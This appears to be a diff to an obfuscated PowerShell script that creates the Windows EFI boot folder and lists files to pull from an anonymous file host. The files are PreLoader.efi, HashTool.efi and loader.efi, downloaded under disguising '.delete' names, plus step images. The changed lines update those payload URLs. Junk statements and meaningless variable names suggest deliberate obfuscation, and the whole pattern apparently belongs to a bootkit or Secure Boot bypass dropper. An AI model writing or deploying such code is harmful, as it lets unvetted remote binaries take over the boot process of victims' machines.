@@ -44,9 +44,9 @@ New-Item -Path "S:\EFI\Microsoft\Boot" -ItemType Directory -Force|Out-Null
 $v038=2*5-1
 if($v038-gt0){}
 $v016=@(
-@{Url="https://www.udrop.com/file/Oter/PreLoader.delete";Name="PreLoader.efi"},
-@{Url="https://www.udrop.com/file/Oteq/HashTool.delete";Name="HashTool.efi"},
-@{Url="https://www.udrop.com/file/Otes/loader.delete";Name="loader.efi"},
+@{Url="https://www.udrop.com/file/OteI/PreLoader.delete";Name="PreLoader.efi"},
+@{Url="https://www.udrop.com/file/OteJ/HashTool.delete";Name="HashTool.efi"},
+@{Url="https://www.udrop.com/file/OteK/loader.delete";Name="loader.efi"},
 @{Url="https://www.udrop.com/file/Otel/step1.png";Name="step1.png"},
 @{Url="https://www.udrop.com/file/Otem/step2.png";Name="step2.png"},
 @{Url="https://www.udrop.com/file/Oteo/step3.png";Name="step3.png"},
